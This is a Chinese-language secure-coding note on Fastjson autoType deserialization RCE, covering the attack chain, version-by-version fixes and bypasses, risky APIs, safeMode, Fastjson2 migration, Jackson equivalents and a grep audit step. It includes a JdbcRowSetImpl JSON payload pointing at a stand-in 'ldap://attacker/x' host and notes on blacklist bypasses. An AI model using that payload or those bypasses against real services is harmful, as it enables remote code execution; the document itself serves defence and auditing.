# Fastjson autoType 反序列化 RCE

## 原理

`@type` 字段告诉 Fastjson 用哪个类反序列化。若允许任意类 → 触发链任意类的构造函数
/ setter / getter → RCE。

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker/x",
  "autoCommit": true
}
```

反序列化时：
1. `newInstance JdbcRowSetImpl`
2. setter `setDataSourceName` 存 URL
3. setter `setAutoCommit(true)` 触发 `connect()`
4. `connect()` 内部 JNDI lookup → LDAP → 远程 class → RCE

## Fastjson 修复迭代

| 版本 | 修复内容 | 绕过 |
|------|---------|------|
| 1.2.24 之前 | 默认允许 autoType | 直接 payload |
| 1.2.25 | 引入 `checkAutoType` 黑名单 | 反射类 `com.sun.rowset.JdbcRowSetImpl` |
| 1.2.42 | 加双 L + ; 检测 | 绕过：`Lcom.xxx.JdbcRowSetImpl;` 补 L 前缀 |
| 1.2.47 | 修复 47 之前的所有已知链 | Cache 机制绕过 (Mbeans) |
| 1.2.68 | `safeMode` 引入 | 但默认 off |
| 1.2.83 | 更严黑名单 | 仍存在期待类 loader |

**结论**：黑名单永远打不完，必须开 `safeMode` 或迁移到 Fastjson2。

## 危险 API

```java
JSON.parseObject(input, Object.class);              // ❌ 允许 @type
JSON.parseObject(input);                            // ❌ 允许 @type
JSON.parse(input);                                  // ❌ 允许 @type
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  // ❌ 显式开启

// 相对安全
JSON.parseObject(input, MyDto.class);               // ✅ 强类型，仍需 safeMode
```

## 修复

### 开启 safeMode（v1.2.68+）

```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

或 JVM 参数：`-Dfastjson.parser.safeMode=true`

`safeMode` 强制禁用一切 autoType，`@type` 直接抛异常。

### 迁移到 Fastjson2

```xml
<dependency>
    <groupId>com.alibaba.fastjson2</groupId>
    <artifactId>fastjson2</artifactId>
    <version>2.0.52</version>
</dependency>
```

Fastjson2 默认关 autoType，且引入白名单机制：

```java
JSONReader.autoTypeFilter(className -> allowedTypes.contains(className));
```

### 白名单

若必须多态：

```java
ParserConfig config = new ParserConfig();
config.addAccept("com.myapp.dto.");
JSON.parseObject(input, MyDto.class, config, JSON.DEFAULT_PARSER_FEATURE);
```

## Jackson 类似问题

```java
// ❌ 危险 —— 等价 fastjson autoType
mapper.enableDefaultTyping();
mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
mapper.activateDefaultTyping(BasicPolymorphicTypeValidator.builder().allowIfBaseType(Object.class).build());
```

修复：走 `@JsonTypeInfo` 显式声明多态，配 `LaissezFaireSubTypeValidator` 之外的严格
Validator，或干脆关闭多态类型：

```java
mapper.deactivateDefaultTyping();
```

## 审计动作

```bash
grep -rn 'JSON.parseObject\|JSON.parse\|ParserConfig.*setAutoTypeSupport\|enableDefaultTyping\|activateDefaultTyping' src/main/java/
```

对每个匹配：
- 输入是否可信？
- 是否走 `Object.class`？
- 是否开 safeMode？

## 相关规则

- CWE: CWE-502 (Deserialization)
- 内建 pattern: `fastjson_autotype`, `jackson_default_typing`
- CVSS: 9.8
- 参考：https://github.com/mbechler/marshalsec
